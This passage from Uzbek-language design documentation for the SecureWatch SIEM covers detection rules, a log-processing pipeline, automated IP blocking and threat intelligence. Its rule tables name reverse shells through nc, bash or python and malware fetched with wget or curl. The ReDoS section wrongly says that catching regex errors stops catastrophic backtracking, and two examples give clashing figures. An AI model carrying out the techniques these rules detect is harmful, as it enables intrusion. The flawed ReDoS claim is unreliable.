| Sudo Exploitation | HIGH | Ruxsatsiz sudo ishlatish | Alert |
| Multiple User Fail | MEDIUM | Bir user ko'p marta xato | Alert |

#### Imtiyoz Oshirish Qoidalari (4 ta)

| Qoida | Daraja | Nima aniqlaydi |
|-------|--------|----------------|
| Sudo Usage | MEDIUM | Sudo ishlatildi → Kim, qachon, nima |
| Sudoers Change | CRITICAL | /etc/sudoers o'zgartirildi |
| New Root User | CRITICAL | UID=0 yangi foydalanuvchi yaratildi |
| SetUID Binary | HIGH | Yangi SUID/SGID fayl topildi |

#### Rootkit / Zararli Dastur (5 ta)

| Qoida | Daraja | Nima aniqlaydi |
|-------|--------|----------------|
| Hidden Process | CRITICAL | /proc bilan ps o'rtasida farq |
| LD_PRELOAD Hijack | CRITICAL | /etc/ld.so.preload g'ayrioddiy |
| Kernel Module | HIGH | Noma'lum kernel modul yuklandi |
| Reverse Shell | CRITICAL | nc/bash/python reverse connection |
| Malware Download | HIGH | wget/curl + chmod +x + execute |

#### Fayl Yaxlitligi (4 ta)

| Qoida | Daraja | Nima aniqlaydi |
|-------|--------|----------------|
| Critical File Change | CRITICAL | /etc/passwd, /etc/shadow o'zgardi |
| SSHD Config Change | HIGH | /etc/ssh/sshd_config o'zgardi |
| Cron Job Added | HIGH | Yangi cron job yozildi |
| SSH Key Added | MEDIUM | ~/.ssh/authorized_keys o'zgardi |

#### Tarmoq Qoidalari (2 ta)

| Qoida | Daraja | Nima aniqlaydi |
|-------|--------|----------------|
| Port Scan | MEDIUM | Bitta IP ko'p portni tekshirdi |
| Firewall Block Spike | HIGH | Bloklangan so'rovlar keskin oshdi |

#### Web Hujum Qoidalari (2 ta)

| Qoida | Daraja | Nima aniqlaydi |
|-------|--------|----------------|
| SQL Injection | HIGH | URL'da SELECT, UNION, DROP pattern |
| Web Scanner | MEDIUM | Nikto, sqlmap, dirbuster imzolari |

#### Brute Force (3 ta)

| Qoida | Daraja | Nima aniqlaydi |
|-------|--------|----------------|
| SSH Brute Force | HIGH | 5+/60s (yuqoridagi kabi) |
| General Auth BF | HIGH | Boshqa servislar brute force |
| Password Spray | HIGH | Ko'p user, kam urinish (evasion) |

#### Mavjudlik (3 ta)

| Qoida | Daraja | Nima aniqlaydi |
|-------|--------|----------------|
| Service Crash | HIGH | Kritik servis to'xtadi |
| OOM Kill | HIGH | Out-of-memory killer ishga tushdi |
| Kernel Panic | CRITICAL | Linux kernel panic |

#### Boshqa (7 ta)

| Qoida | Daraja | Nima aniqlaydi |
|-------|--------|----------------|
| AppArmor Deny | MEDIUM | AppArmor profilga zid harakat |
| USB Device | MEDIUM | Yangi USB qurilma ulandi |
| Docker Privileged | CRITICAL | --privileged container |
| Docker Socket Mount | CRITICAL | /var/run/docker.sock mount |
| Container Escape | CRITICAL | Container'dan chiqish urinishi |
| Windows New Service | HIGH | Yangi Windows xizmat o'rnatildi |
| Audit Log Cleared | CRITICAL | Windows audit log tozalandi |

### Qoidalar qanday baholanadi?

```
CRITICAL → Darhol munosabat kerak, sistem xavf ostida
HIGH     → Tez munosabat kerak, potentsial hujum
MEDIUM   → Tekshiruv kerak, shubhali holat
LOW      → Ma'lumot uchun, kuzatish davom ettirilsin

Avtomatik harakat:
  CRITICAL → IP bloklash + Email + Slack + Incident yaratish
  HIGH     → IP bloklash + Email
  MEDIUM   → Email yoki Slack
  LOW      → Dashboard'da ko'rsatish
```

---

## ⚙️ Ishlov Berish Quvuri — 8 Bosqich

Log kelgandan alertgacha bo'lgan to'liq yo'l:

```
📥 KIRISH: Agent HTTP/HTTPS orqali log yubordi
           {raw: "May 02 23:41:02 server sshd: Failed password..."}
                              │
                              ▼
┌─────────────────────────────────────────────────────┐
│  BOSQICH 1: DECODER                                 │
│                                                     │
│  500+ log formatini tushunadi:                      │
│  syslog RFC3164/5424, CEF, JSON, Windows XML,       │
│  nginx, Apache, auditd, Docker, Kubernetes          │
│                                                     │
│  Natija:                                            │
│  {                                                  │
│    event_type: "ssh_failed_login",                  │
│    ssh_user:   "root",                              │
│    ssh_src_ip: "84.33.21.5",                        │
│    timestamp:  "2026-05-02T23:41:02Z",             │
│    hostname:   "web-server-01"                      │
│  }                                                  │
└──────────────────────────┬──────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────┐
│  BOSQICH 2: THREAT INTELLIGENCE BOYITISH            │
│                                                     │
│  84.33.21.5 → AbuseIPDB: score=87, shikoyat=342    │
│  84.33.21.5 → Firehol: emas                         │
│  84.33.21.5 → GeoIP: Russia, Moscow, Rostelecom     │
│                                                     │
│  Boyitilgan log:                                    │
│  {                                                  │
│    ...avvalgi maydonlar...,                         │
│    geo_country: "Russia",                           │
│    geo_city: "Moscow",                              │
│    abuse_score: 87,                                 │
│    is_malicious: true                               │
│  }                                                  │
└──────────────────────────┬──────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────┐
│  BOSQICH 3: QOIDA TEKSHIRUVI                        │
│                                                     │
│  Har bir qoida uchun (36 ta):                       │
│  • source match?      ✓ (auth.log)                  │
│  • message match?     ✓ ("Failed password" regex)   │
│  • field values?      ✓ (ssh_user = root)           │
│  • numeric compare?   ✓ (abuse_score > 80)          │
│                                                     │
│  ReDoS himoyasi:                                    │
│    Regex xatosi bo'lsa → log qolib qolmaydi,       │
│    warning yozib keyingiga o'tadi                   │
└──────────────────────────┬──────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────┐
│  BOSQICH 4: CHASTOTA TAHLILI (Sliding Window)       │
│                                                     │
│  "SSH Brute Force" qoidasi uchun:                   │
│  Shart: 5 ta hodisa / 60 sekund                     │
│  Group by: agent_id + src_ip                        │
│                                                     │
│  Redis'da hisoblagich:                              │
│  brute:web-server-01:84.33.21.5 → 1 (TTL: 60s)    │
│  ... 4 ta keldi ...                                 │
│  brute:web-server-01:84.33.21.5 → 5 → TRIGGER!     │
│                                                     │
│  Collision oldini olish:                            │
│  agg_key = SHA256("rule_id:agent_id:src_ip")[:32]  │
│  (oddiy string birlashtirish xato berishi mumkin)   │
└──────────────────────────┬──────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────┐
│  BOSQICH 5: ANOMALIYA DETEKSIYASI (Welford)         │
│                                                     │
│  Har bir metrika uchun statistik bazeline:          │
│  web-server-01 odatda soatiga 12 login urinishi     │
│                                                     │
│  Hozir: 450 urinish                                 │
│  Z-score = (450 - 12) / 8.2 = 53.4 → JUDA BALAND! │
│                                                     │
│  Z-score > 3.0 → HIGH severity anomaly             │
│  Z-score > 2.0 → MEDIUM severity anomaly           │
│                                                     │
│  Welford algoritmi — O(1) xotira:                   │
│  Barcha tarixni saqlash shart emas,                 │
│  faqat 3 ta qiymat: n, mean, M2                     │
└──────────────────────────┬──────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────┐
│  BOSQICH 6: KORRELYATSIYA                           │
│                                                     │
│  Bir vaqtdagi pattern'larni bog'laydi:              │
│                                                     │
│  Pattern 1: Brute Force → Success Chain             │
│    1. SSH brute force (HIGH)                        │
│    2. SSH muvaffaqiyatli login (bir IP'dan)         │
│    → CRITICAL composite alert!                      │
│                                                     │
│  Pattern 2: Privilege Escalation → Persistence      │
│    1. Sudo noto'g'ri foydalanish                   │
│    2. /etc/sudoers o'zgarishi                       │
│    3. Yangi cron job                                │
│    → Hujum zanjiri aniqlandi!                       │
└──────────────────────────┬──────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────┐
│  BOSQICH 7: MITRE ATT&CK TEGLASH                    │
│                                                     │
│  Har alert uchun avtomatik:                         │
│  Taktika:  "Credential Access" (TA0006)            │
│  Texnika:  "Brute Force" (T1110)                   │
│  Sub-tex.: "Password Guessing" (T1110.001)          │
│                                                     │
│  Bu nima beradi:                                    │
│  • Compliance hisobotlari uchun zarur               │
│  • Hujum fazasini tushunish                         │
│  • Incident response yo'naltirish                   │
└──────────────────────────┬──────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────┐
│  BOSQICH 8: ALERT YARATISH va TARQATISH             │
│                                                     │
│  Aggregatsiya (24 soat ichida bir xil → birlashtir):│
│  Agar "SSH BF: 84.33.21.5" bugun allaqachon → +1  │
│                                                     │
│  Cooldown (flood oldini olish):                     │
│  Bir xil alert 5 daqiqada yana kelmaydi            │
│                                                     │
│  Saqlash va tarqatish:                              │
│  ├─► PostgreSQL (doimiy saqlash)                   │
│  ├─► Elasticsearch (qidiruv, tahlil)               │
│  ├─► WebSocket → Dashboard (real vaqt)             │
│  ├─► Active Response (avtomatik harakat)           │
│  └─► Notification (email/Slack/webhook)             │
└─────────────────────────────────────────────────────┘

📤 CHIQISH: Operator dashboardda alert ko'radi, IP bloklangan,
            email oldi — barchasi ~60 sekund ichida!
```

---

## 🛡️ Active Response — Avtomatik Javob

### Nima qiladi?

Hujum aniqlanganida **avtomatik** harakat qiladi. Operator hech narsa qilmasa ham tizim o'zini himoya qiladi.

### Harakat turlari

#### 1. IP Bloklash
```
Qanday ishlaydi:
  SIEM → Agent'ga buyruq yuboradi
  Agent → iptables -A INPUT -s 84.33.21.5 -j DROP

Sozlanuvchi:
  block_duration: 3600   → 1 soat
  block_duration: 86400  → 1 kun
  block_duration: 0      → Doimiy (ehtiyotkorlik bilan!)

Avtomatik ochish:
  1 soat o'tgach → iptables -D INPUT -s 84.33.21.5 -j DROP
  IP yana urinsa → Yana bloklanadi, davomiyligi ikki barobar

Windows'da:
  netsh advfirewall firewall add rule name="SIEM-Block-IP"
  dir=in action=block remoteip=84.33.21.5
```

#### 2. Email Xabarnoma
```
Kontent:
  Subject: 🚨 [CRITICAL] SSH Brute Force — web-server-01

  Salom, Administrator!

  Xavfsizlik hodisasi aniqlandi:
  ───────────────────────────────
  Vaqt:     2026-05-02 23:41:02
  Server:   web-server-01
  Tahdid:   SSH Brute Force
  Manba IP: 84.33.21.5 (Russia, Moscow)
  Joylashuv:Rostelecom (AS12389)
  AbuseIPDB:87% xavflilik
  Urinishlar:500 muvaffaqiyatsiz / 60 sekund
  
  Amalga oshirilgan harakat:
  ✅ IP bloklandi (3600 sekund)
  
  Dashboard: http://84.8.147.84:8080/alerts
```

#### 3. Slack Webhook
```json
{
  "text": "🔴 *CRITICAL ALERT*",
  "attachments": [{
    "color": "#FF0000",
    "fields": [
      {"title": "Tahdid", "value": "SSH Brute Force"},
      {"title": "Server", "value": "web-server-01"},
      {"title": "IP", "value": "84.33.21.5 (Russia)"},
      {"title": "Harakat", "value": "✅ IP bloklandi"}
    ]
  }]
}
```

#### 4. Custom Webhook
```
Istalgan tizimga so'rov yuborish:
  PagerDuty → Navbatchilik tizimi
  Jira → Ticket yaratish
  Telegram Bot → Xabar yuborish
  Custom API → O'zingizning tizimingiz
```

---

## 🔍 Threat Intelligence — Tahdid Ma'lumotlari

### Nima bu?

Threat Intelligence — bu "kim yomon" degan ma'lumotlar bazasi. SIEM har bir IP va domen'ni bu bazalar bilan tekshiradi.

### AbuseIPDB
```
Dunyo bo'ylab 50M+ shikoyat yozilgan baza.
Har kim yomon IP'ni bu bazaga bildirishi mumkin.

Tekshiruv natijasi:
  84.33.21.5 → {
    "abuseConfidenceScore": 87,  ← 87% yomon ekan
    "totalReports": 342,         ← 342 ta shikoyat
    "lastReportedAt": "2026-05-01",
    "countryCode": "RU",
    "isp": "Rostelecom"
  }

Threshold: Score > 80 → has_malicious_ip = true
```

### Firehol
```
Offline IP qora ro'yxatlar to'plami.
Internet aloqasisiz ham ishlaydi.

Level 1: Eng ishonchli yomon IP'lar
  - Tor exit nodes
  - Ma'lum botnet'lar
  - Skannerlar

Yangilash: Kunlik avtomatik yuklab olish
Hajmi: ~5 million IP manzil
```

### VirusTotal
```
Domain va URL tekshiruv.
70+ antivirus va xavfsizlik kompaniyasi natijalari.

Tekshiruv:
  evil.com → 23/70 engine "MALICIOUS" dedi
  → DNS monitoring'da bu domenga murojaat → ALERT
```

### GeoIP
```
MaxMind GeoIP2 bazasi.
IP → Mamlakat, shahar, koordinatlar, ASN, ISP

Foydalanish:
  Dashboard xaritasi → Qayerdan hujum ko'proq?
  Filter → "Faqat Rossiyadan kelgan alertlar"
  Report → "Bu oy top-5 hujum mamlakati"
```

### IOC Boshqaruvi
```
IOC = Indicator of Compromise (Buzilish belgisi)

Turlari:
  IP adreslar    → Yomon IP ro'yxati
  Domenlar       → Yomon domenlar
  MD5/SHA hashes → Zararli fayl hashlari
  URL'lar        → Zararli URL'lar

Qanday qo'shiladi:
  1. Dashboard → Threat Intel → IOC
  2. Yangi IOC qo'shish
  3. Barcha yangi loglar bu IOC bilan tekshiriladi
  4. Mos kelsa → CRITICAL alert
```

---

## 📈 Anomaliya Deteksiyasi

### Oddiy tushuntirish

Tasavvur qiling: Siz kuniga o'rtacha 100 ta email olasiz.
Bugun 10,000 ta email keldi → Bu anomaliya!

SIEM ham xuddi shunday. Har bir server uchun "normal" ko'rsatkichlarni o'rganadi va ulardan keskin farq qilsa → alert.

### Welford Algoritmi (Statistika)

```
Muammo: Million ta log uchun o'rtacha va standart og'ishni hisoblash
Oddiy usul: Barcha qiymatlarni xotirada saqlash → Impossibly katta RAM

Welford yechimi: Faqat 3 ta son zarur
  n    → Nechta hodisa ko'rildi
  mean → Joriy o'rtacha
  M2   → Dispersiya uchun yig'ma

Yangi qiymat kelganda (O(1) operatsiya):
  delta = new_value - mean
  mean  = mean + delta / n
  M2    = M2 + delta * (new_value - mean)
  var   = M2 / (n - 1)
  std   = sqrt(var)

Redis'da saqlash: {n, mean, M2} → Bitta agent uchun bitta kalit
```

### Z-Score Hisoblash

```
Z-score = (joriy_qiymat - o'rtacha) / standart_og'ish

Misol:
  web-server-01 uchun login urinishlari:
  O'rtacha: 12/soat
  Std:       3.2

  Bugun:    450/soat
  Z-score = (450 - 12) / 3.2 = 136.9

  Z > 3.0 → HIGH anomaly    (statistik ehtimol: 0.3%)
  Z > 2.0 → MEDIUM anomaly  (statistik ehtimol: 5%)

Alert: "web-server-01: login_attempts 136.9σ dan yuqori (HIGH)"
```

### Kuzatiladigan metrikalar

```
Har agent uchun:
  login_attempts     → SSH/auth login urinishlari soatiga
  failed_logins      → Muvaffaqiyatsiz loginlar
  cpu_usage          → CPU foizi
  memory_usage       → RAM foizi
  network_bytes      → Tarqatiladigan ma'lumot hajmi
  unique_ips         → Nechta yangi IP manzil ulandı
  process_count      → Ishlaydigan jarayonlar soni
  dns_queries        → DNS so'rovlar soni
```

---

## 🖥️ Frontend — 16 ta Sahifa

### 1. Dashboard — Asosiy Panel

```
┌────────────────────────────────────────────────────────┐
│  SecureWatch SIEM                     🔴 3 ta yangi    │
├──────────┬─────────────┬──────────────┬────────────────┤
│  Jami    │  CRITICAL   │  HIGH        │  MEDIUM        │
│  Alertlar│    ██ 12    │   ████ 28    │  ██████ 45     │
│   247    │             │              │                │
├──────────┴─────────────┴──────────────┴────────────────┤
│  So'nggi 24 soat log hajmi           Agent'lar holati  │
│  ████████████████████  150K logs      ● web-01  ONLINE │
│                                       ● db-01   ONLINE │
│  [Grafik: soat bo'yicha log soni]     ● win-01  ONLINE │
├───────────────────────────────────────────────────────┤
│  So'nggi alertlar                                      │
│  🔴 23:41 SSH Brute Force  web-01  84.33.21.5  HIGH   │
│  🟡 23:38 New Cron Job     db-01   —           MED    │
│  🔴 23:15 Root Login       win-01  —           CRIT   │
└───────────────────────────────────────────────────────┘
```

**Real-time WebSocket:** Yangi alert kelganda sahifani yangilash shart emas, avtomatik ko'rinadi.

### 2. Agents — Agent Boshqaruvi

```
Har bir agent uchun:
  ● Holati (Online/Offline/Warning)
  ● Oxirgi yurak urishi (qachon)
  ● Versiyasi
  ● OS turi
  ● Yuborilgan log soni (bugun)
  ● Jami alert soni

Agent detail sahifasi:
  → So'nggi loglar (real vaqt)
  → Resurs grafiklari (CPU, RAM)
  → Agent sozlamalari
  → Deploy qilish (yangi agent o'rnatish ko'rsatmasi)
```

### 3. Alerts — Alert Boshqaruvi

```
Filtrlar:
  • Daraja (CRITICAL/HIGH/MEDIUM/LOW)
  • Vaqt oralig'i
  • Agent
  • Qoida nomi
  • Status (yangi/tekshirilmoqda/yechildi/yolg'on signal)

Har bir alert uchun:
  → To'liq ma'lumotlar (IP, user, fayl, timestamp)
  → MITRE ATT&CK taktika/texnika
  → GeoIP xarita
  → Tegishli loglar
  → Tayinlash (kim tekshiradi?)
  → Izoh qoldirish
  → Case yaratish (incident management)
  → Yolg'on signal deb belgilash
```

### 4. Logs — Log Qidiruv

```
Qidiruv imkoniyatlari:
  • Kalit so'z           → "Failed password"
  • IP manzil            → 84.33.21.5
  • Agent               → web-server-01
  • Vaqt oralig'i        → [Boshlanish] → [Tugash]
  • Log darajasi         → ERROR, WARNING, INFO
  • Manba fayl          → auth.log, syslog
  • Hodisa turi          → ssh_failed_login

Natijar:
  • Timeline ko'rinishi
  • Jadval ko'rinishi
  • CSV/JSON eksport
  • Max 500 natija bir sahifada
  • Pagination
```

### 5. Rules — Qoida Boshqaruvi

```
Mavjud qoidalarni ko'rish:
  • Nomi, tavsifi, darajasi
  • Yoqilgan/O'chirilgan
  • Oxirgi ishga tushish vaqti
  • Nechta marta ishga tushgan

Yangi qoida yaratish:
  • YAML editor (sintaks podsvecheniye)
  • Test rejimi (haqiqiy log bilan sinash)
  • Saqlash va faollashtirish

Qoidani tahrirlash:
  • Mavjud qoidani o'zgartirish
  • Versiya tarixi
```

### 6. Active Response — Javob Siyosatlari

```
Mavjud siyosatlar:
  SSH Brute Force → IP bloklash 3600s + Email
  Root Login      → Email + Slack + Case yaratish
  Malware Download→ IP bloklash + DARHOL email

Yangi siyosat yaratish:
  Trigger:  Qaysi qoida ishga tushganda?
  Harakat:  IP bloklash / Email / Slack / Webhook
  Davomiyligi: Qancha vaqt bloqlash?

Ijro tarixi:
  2026-05-02 23:41  SSH BF  84.33.21.5  Bloklandi  ✓
  2026-05-02 22:15  Root    —           Email       ✓
  2026-05-01 14:33  Malware 1.2.3.4    Bloklandi  ✓
```

### 7. Threat Intelligence — IOC Boshqaruvi

```
IOC qidirish:
  Istalgan IP, domen, hash kiriting → Tekshiruv natijasi

IOC qo'shish:
  Tur: IP / Domen / Hash / URL
  Qiymat: 84.33.21.5
  Izoh: "Ma'lum C2 server"
  Manba: Tahlilchi / Tashqi feed

Tashqi tekshiruv:
  AbuseIPDB → Natija ko'rsatish
  VirusTotal → 70 engine natijasi
```

### 8. Vulnerabilities — Zaiflik Kuzatuvi

```
Har agent uchun zaiflik ro'yxati:
  Paket      Versiya    CVE           Score  Status
  openssl    1.1.1t     CVE-2023-0215  7.5   🔴 Yuqori
  libssl     1.1.1t     CVE-2023-0286  7.8   🔴 Yuqori
  curl       7.68.0     CVE-2023-23916  6.5  🟡 O'rta

Remediation:
  "apt upgrade openssl libssl-dev" buyrug'i ko'rsatiladi

Filter:
  • Score bo'yicha (> 7.0)
  • Status bo'yicha (tuzatilgan/tuzatilmagan)
  • Paket nomi
```

### 9. SCA — Compliance Tekshiruvi

```
CIS Level 1 natijasi (misol):
  Passed: 42/50 tekshiruv
  Failed: 8/50 tekshiruv

Muvaffaqiyatsiz tekshiruvlar:
  ✗ SSH PermitRootLogin 'no' emas (kritik!)
  ✗ Parol uzunligi 12 dan kam
  ✗ /tmp noexec o'rnatilmagan
  ✗ Telnet o'rnatilgan (eski, xavfli protokol)

Har bir tekshiruv uchun:
  → Muammo tavsifi
  → Qanday tuzatish kerak (buyruq bilan)
  → Standart manbasi (CIS ID, STIG ID)
```

### 10-16. Qolgan Sahifalar

```
10. Inventory   → Server inventarizatsiya (paketlar, portlar, jarayonlar)
11. Correlation → Ko'p hodisa pattern qoidalari
12. Cases       → Incident boshqaruv (Jira'ga o'xshash)
                  Alert → Case yaratish → Tayinlash → Yechish
13. Audit Log   → Kim nima qildi? (barcha amallar qayd etiladi)
14. Reports     → CSV/JSON eksport, umumiy statistika
15. Settings    → Profil, parol, 2FA sozlamalari, bildirishnomalar
16. User Mgmt   → Admin: foydalanuvchi qo'shish/o'chirish/rol berish
```

---

## 🔒 Xavfsizlik Qatlamlari

### Qatlam 1: Tarmoq Xavfsizligi (Nginx)

```
Rate Limiting (sekundiga so'rovlar chekovi):
  /api/auth/      → 20 so'rov/daqiqa  (brute force oldini olish)
  /api/logs/ingest→ 600 so'rov/daqiqa (agentlar uchun)
  /api/           → 300 so'rov/daqiqa (umumiy API)

Muhim HTTP xavfsizlik sarlavhalari:
  X-Frame-Options: DENY
    → Boshqa sayt SIEM'ni iframe'ga solib bo'lmaydi (Clickjacking)
  
  X-Content-Type-Options: nosniff
    → Brauzer faylni noto'g'ri MIME tur sifatida bajarmaydi
  
  X-XSS-Protection: 1; mode=block
    → Brauzer XSS hujumni aniqlasa bloklaydi
  
  Strict-Transport-Security: max-age=63072000
    → 2 yil davomida faqat HTTPS ishlatilsin (HSTS)
  
  Content-Security-Policy:
    → Faqat o'zimizning JS va CSS yuklansin, tashqi emas

Bloklangan fayllar:
  *.git, *.env, *.htpasswd → 404 qaytaradi
  (Yashirin konfiguratsiya fayllarni himoya qiladi)
```

### Qatlam 2: Autentifikatsiya

```
JWT (JSON Web Token):
  Access Token:   60 daqiqa amal qiladi
  Refresh Token:  7 kun amal qiladi
  Imzolash:       HS256 (SECRET_KEY bilan)

  Ishlatish:
    Login → {access_token, refresh_token}
    Har so'rovda: Authorization: Bearer <access_token>
    60 daqiqa o'tsa → refresh_token bilan yangilash
    7 kun o'tsa → Qayta login

Logout:
  access_token → Redis'ga qora ro'yxatga qo'shiladi
  Keyingi so'rovda bu token qabul qilinmaydi
  (Token amal qilish muddati tugaguncha bloklangan)

TOTP 2FA (Two-Factor Authentication):
  Google Authenticator bilan:
    Login → Parol → 6-raqamli kod → Kirish
  
  Backup kodlar:
    2FA telefoni yo'qolsa 8 ta backup kod bilan kirish
    Bir marta ishlatiladi, keyin o'chiriladi
  
  Brute Force himoyasi:
    10 ta noto'g'ri kod → Hisob 30 daqiqa bloklanadi
```

### Qatlam 3: Ma'lumotlar Bazasi Xavfsizligi

```
PostgreSQL:
  ✓ Connection pooling (SQLAlchemy async)
  ✓ Parametrlangan so'rovlar (SQL Injection yo'q)
  ✓ Alohida DB foydalanuvchisi (root emas)
  ✓ Shifrlangan parollar (bcrypt, cost=12)

Elasticsearch:
  ✓ X-Pack Security yoqilgan
  ✓ Basic Auth (username/password)
  ✓ TLS/SSL (ixtiyoriy, sozlanuvchi)
  ✓ Faqat backend'dan kirishimumkin

Redis:
  ✓ AUTH parol himoyasi
  ✓ Faqat localhost va backend'dan kirish
  ✓ Sessionlar shifrlangan JWT

Parollar:
  bcrypt, cost factor 12
  Taxminiy brute force vaqti: 100 yil+
```

### Qatlam 4: Kod Xavfsizligi

```
ReDoS himoyasi:
  Regex Pattern:  (a+)+ → Bu yomon! Eksponensial vaqt!
  Qoida tekshiruvida:
    try:
      re.search(pattern, text)
    except re.error:
      → Xato regex → Warning + o'tkazib yuborish
      → Tizim to'xtamaydi

SQL Injection himoyasi:
  SQLAlchemy ORM ishlatiladi
  Foydalanuvchi kiritgan ma'lumot hech qachon SQL'ga to'g'ridan bevosita kirmaydi:
  
  Xavfli: f"SELECT * FROM users WHERE name='{user_input}'"
  Xavfsiz: session.execute(select(User).where(User.name == user_input))

Production SECRET_KEY majburligi:
  DEBUG=false holda:
    SECRET_KEY yo'q → RuntimeError (server ishga tushmaydi)
  
  DEBUG=true holda:
    Vaqtinchalik kalit yaratiladi (development uchun)
    Warning log yoziladi

Agent autentifikatsiyasi:
  Har agent → O'z Agent Secret kaliti
  Noto'g'ri kalit → 401 Unauthorized
  Bir agentning kaliti boshqa agent ishlata olmaydi
```

---

## 📊 Monitoring va Sog'liq Tekshiruvi

### Prometheus Metrikalar

```
Backend tomonidan eksport qilingan metrikalar:
  http_requests_total{method, endpoint, status}
  http_request_duration_seconds{method, endpoint}
  active_connections_total
  alerts_created_total{severity}
  logs_indexed_total
  agent_heartbeat_last_seen{agent_id}

Elasticsearch:
  elasticsearch_cluster_health_status{status}
  elasticsearch_jvm_heap_used_bytes
  elasticsearch_disk_watermark_*

PostgreSQL:
  pg_up
  pg_database_size_bytes
  pg_stat_activity_count

Redis:
  redis_up
  redis_memory_used_bytes
  redis_connected_clients
```

### 7 ta Prometheus Alert Qoidasi

```yaml
1. BackendDown (1 daqiqa)
   Shart: up{job="backend"} == 0 (1 daqiqa)
   Xabar: "Backend server tushib qoldi!"
   Daraja: CRITICAL

2. ElasticsearchDown (2 daqiqa)
   Shart: elasticsearch_cluster_health_status != 1 (2 daqiqa)
   Xabar: "Elasticsearch ulanmadi!"
   Daraja: CRITICAL

3. ElasticsearchClusterRed
   Shart: cluster status == "red"
   Xabar: "Elasticsearch cluster RED — ma'lumot yo'qolishi mumkin!"
   Daraja: CRITICAL

4. HighBackendErrorRate (5 daqiqa)
   Shart: 5xx javob darajasi > 5% (5 daqiqa)
   Xabar: "Backend xatolari keskin oshdi"
   Daraja: WARNING

5. HighMemoryUsage (5 daqiqa)
   Shart: Xotira ishlatilishi > 85% (5 daqiqa)
   Xabar: "Server xotirasi to'lib qolmoqda!"
   Daraja: WARNING

6. ElasticsearchDiskHigh (30 daqiqa)
   Shart: Bo'sh disk < 15% (30 daqiqa)
   Xabar: "Elasticsearch diski tugayapti!"
   Daraja: WARNING

7. AgentHeartbeatMissing (10 daqiqa)
   Shart: Agent oxirgi yurak urishi > 10 daqiqa oldin
   Xabar: "Agent {agent_id} javob bermayapti!"
   Daraja: WARNING
```

### Grafana Dashboard

```
Panellar:
  1. Backend request per second (grafik)
  2. Response time p50/p90/p99 (grafik)
  3. Active connections (gauge)
  4. Alerts rate by severity (bar chart)
  5. Elasticsearch heap usage (gauge)
  6. Agent heartbeat status (table)
  7. Log ingestion rate (grafik)
  8. Error rate (grafik)

Kirish:
  URL: http://server:3001
  Login: admin / admin (birinchi kirishda o'zgartiring!)
```

### Tizim Sog'liq API

```
GET /api/health

Javob:
{
  "status": "healthy",
  "timestamp": "2026-05-02T23:41:02Z",
  "services": {
    "database": "ok",
    "elasticsearch": "ok",
    "redis": "ok"
  },
  "version": "4.0.0"
}

"ok" emas bo'lsa → Nimadir ishlamayapti!
```

---

## 🔧 Texnik Stack

### Nima uchun bu texnologiyalar tanlandi?

#### Backend: FastAPI (Python)
```
Nima?  Python'da eng tez web framework
Nima uchun?
  ✓ Async/await — bir vaqtda minglab so'rovlarni boshqarish
  ✓ Avtomatik OpenAPI docs (/docs sahifasi)
  ✓ Pydantic — ma'lumot validatsiyasi avtomatik
  ✓ Keng Python ekosistema (ML, kriptografiya, tarmoq)
  ✓ Production-ready (Netflix, Microsoft ishlatadi)

Benchmark:
  FastAPI: ~60,000 req/sec
  Django:  ~20,000 req/sec
  Flask:   ~15,000 req/sec
```

#### Ma'lumotlar Bazasi: PostgreSQL 15
```
Nima?  Kuchli open-source relatsion ma'lumotlar bazasi
Nima uchun?
  ✓ ACID (ma'lumot hech qachon yo'qolmaydi)
  ✓ Murakkab so'rovlar (JOIN, transaction)
  ✓ JSON qo'llab-quvvatlash (JSONB)
  ✓ 35+ yillik ishonchlilik tarixi
  ✓ Async connection pooling (pgbouncer o'rniga SQLAlchemy)

Nima saqlanadi:
  Foydalanuvchilar, qoidalar, alertlar, insidentlar,
  audit log, active response siyosatlari
```

#### Log Saqlash: Elasticsearch 8.11
```
Nima?  Kuchli full-text qidiruv va tahlil mexanizmi
Nima uchun?
  ✓ Millionlab logdan < 1 sek qidiruv
  ✓ JSON formatda saqlash
  ✓ Aggregatsiya (statistika, graflar)
  ✓ ILM — avtomatik indeks boshqaruvi (saqlash/o'chirish)
  ✓ Horizontal scale (ko'p node)

ILM (Index Lifecycle Management):
  Hot  (0-7 kun):  Tez disk, tez qidiruv
  Warm (7-45 kun): O'rtacha disk, birlashtirish
  Cold (45-90 kun):Sekin disk, arxiv
  Delete (90+ kun):Avtomatik o'chirish
```

#### Kesh: Redis 7
```
Nima?  In-memory ma'lumotlar tuzilmasi
Nima uchun?
  ✓ Sessiyalar (microseconds latency)
  ✓ Rate limiting (atomic hisoblagichlar)
  ✓ Pub/Sub (WebSocket ko'p worker)
  ✓ Anomaliya baseline'lari

Ko'p worker muammosi:
  Backend 4 ta parallel process'da ishlaydi
  Bitta foydalanuvchi WebSocket ulanishi qaysi process'da?
  Redis Pub/Sub yechim:
    Har process → Redis kanaliga subscribe
    Broadcast → Redis'ga publish → Barcha process qabul qiladi
```

#### Frontend: React 18
```
Nima?  Meta (Facebook) tomonidan yaratilgan UI kutubxonasi
Nima uchun?
  ✓ Component-based (qayta ishlatish)
  ✓ React 18 Concurrent Mode (tez render)
  ✓ Keng ekosistema (Recharts, React Router, ...)
  ✓ Error Boundary (xato bo'lsa tizim to'xtamaydi)
  ✓ WebSocket real-time yangilash

Axios retry (takroriy urinish):
  So'rov muvaffaqiyatsiz bo'lsa:
  1 sek kutib → qayta urinish
  2 sek kutib → qayta urinish
  4 sek kutib → qayta urinish
  8 sekdan ko'p → Xato ko'rsatish
  (Exponential backoff)
```

### To'liq Stack Jadvali

| Qatlam | Texnologiya | Versiya | Rol |
|--------|-------------|---------|-----|
| Proxy | Nginx | alpine | Reverse proxy, SSL, rate limit |
| Backend | FastAPI | 0.110+ | API, detection, response |
| DB | PostgreSQL | 15 | Doimiy ma'lumotlar |
| Log | Elasticsearch | 8.11 | Log saqlash, qidiruv |
| Kesh | Redis | 7 | Sessiya, cache, pub/sub |
| ORM | SQLAlchemy | 2.0 | Async DB bilan ishlash |
| Frontend | React | 18 | UI panel |
| Stil | TailwindCSS | 3 | CSS framework |
| HTTP | Axios | latest | API so'rovlar |
| Bundler | Vite | latest | Frontend build |
| Metrics | Prometheus | latest | Monitoring |
